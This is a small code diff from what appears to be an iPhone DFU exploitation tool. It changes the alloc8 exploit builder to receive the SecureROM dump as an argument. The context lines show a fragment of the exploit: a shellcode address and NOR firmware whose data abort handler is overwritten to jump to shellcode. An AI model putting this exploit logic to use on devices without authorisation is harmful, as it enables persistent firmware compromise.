@@ -309,7 +309,7 @@ class PwnedDFUDevice():
         assert len(nor) == len(new_nor)
         return new_nor
 
-    def add_alloc8_exploit_to_nor(self, nor):
+    def add_alloc8_exploit_to_nor(self, nor, securerom):
         SHELLCODE_ADDRESS = 0x84026214 + 1
         MAX_SHELLCODE_LENGTH = 460
         REQUIRED_IMG3_COUNT = 714
@@ -377,7 +377,6 @@ class PwnedDFUDevice():
         new_nor_firmware += empty_img3_data(final_size)
 
         # Only override data abort handler, keep the rest
-        securerom = self.securerom_dump()
         securerom_block = securerom[8:8+NOR_READ_SIZE]
         new_nor_firmware += securerom_block[:40] + struct.pack('<I', SHELLCODE_ADDRESS) + securerom_block[44:]
         new_nor_firmware += '\xff' * (len(nor_firmware) - len(new_nor_firmware))
